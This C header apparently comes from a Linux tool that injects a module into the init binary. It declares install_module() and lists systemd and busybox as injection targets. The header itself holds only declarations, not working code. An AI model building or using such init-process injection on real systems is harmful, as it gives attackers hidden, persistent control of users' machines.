#pragma once
#include <elf.h>
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include "common.h"

#define ALIGN_UP(x, mask) (((x) + mask) & ~mask)
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof((arr)[0]))

/**
 * install_module - Install the module to the system
 *
 * This will inject this module to the init binary.
 * On most of the linux distributions, it is systemd.
 *
 * @module_start: Start address of the module
 * @module_end: End address of the module
 */
void install_module(const char module_start[], const char module_end[]);


/**
 * Put the target you want to inject in this array.
 */
static char *sys_daemons[] = {"/lib/systemd/systemd", "/bin/busybox"};
